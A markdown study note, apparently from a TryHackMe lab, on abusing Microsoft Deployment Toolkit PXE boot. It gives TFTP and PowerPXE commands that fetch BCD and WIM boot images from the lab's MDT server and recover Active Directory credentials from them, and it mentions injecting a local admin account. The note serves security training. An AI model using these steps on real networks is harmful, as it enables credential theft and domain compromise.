# Microsoft Deployment Toolkit

- Microsoft service that assists with automating the deployment of Microsoft OS's

- Organizations use services such as MDT to help deploy new images in the across the estate efficiently

- Base images can be maintained and updated in a central location

# SCCM

- MDT is integrated with SCCM

- MDT is used to create + manage + host PXE boot images

- PXE boot is integrated with DHCP

- If DHCP assigns an ip lease, the host is allowed to request the PXE boot image and start the network installation process

## PXE Boot Process
![Alt text](<../../Images/PXE Boot Process.png>)

Once the process above is performed, the client will use a TFTP connection to download the PXE boot image.

We can exploit the PXE boot image process for 2 different purposes:

- Inject a privilege escalation vector (Local Admin Account) to gain admin access to the operating system once the PXE boot has been completed

- Perform password scraping attacks to recover AD credentials used during the installation

# PXE Boot Image Retrieval

- Skip the part where we attempt to request an IP + PXE Boot preconfigure details from DHCP

- 1st piece of information regarding the PXE Boot preconfigure received via DHCP is the IP of the MDT server

- 2nd piece of information received would be the names of BCD files

- BCD files store the information relevant to PXE Boots for the different types of architecture

Connect to http://pxeboot.za.tryhackme.com (MDT Server) to view the BCD files:

![Alt text](<../../Images/BCD Files.png>)

- Use TFTP to request each of the BCD files and enumerate configuration

- Focus on the BCD file of the x64 architecture

- Copy and store the full name of this file: x64{7B...B3}.bcd

### SSH into THMJMP1 (Windows Machine)

- Create a folder with your username (Cameron) and copy the powerpxe folder

<pre>
C:\Users\THM>cd Documents
C:\Users\THM\Documents> mkdir &lt;username&gt;
C:\Users\THM\Documents> copy C:\powerpxe &lt;username&gt;\
C:\Users\THM\Documents\> cd &lt;username&gt;
</pre>

- Use TFTP to download BCD file to read the configuration of the MDT Server
- BCD files are located in /TMP/ directory on MDT Server

<pre>
C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{7B...B3}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
</pre>

- THMMDT Server ip address

<pre> nslookup thmmdt.za.tryhackme.com </pre>

- BCD file has now been recovered
- Use `powerpxe.ps1` to read contents
- Powerpxe is a PowerShell script that performs this type of attack

- `Get-WimFile` recover the locations of PXE Boot images in BCD file

<pre>

C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.   

PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : PXE Boot Image Location
PXE Boot Image Location
</pre>

- WIM files are bootable images in Windows Imaging Format
- Now we have location of PXE Boot Image. we can use TFTP to download it

<pre>
PS C:\Users\THM\Documents\am0> tftp -i THMMDT IP GET "PXE Boot Image Location" pxeboot.wim
</pre>

# Recover Credentials from PXE Boot Image
- Use powerpxe to recover the credentials from bootstrap file

<pre> PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim </pre>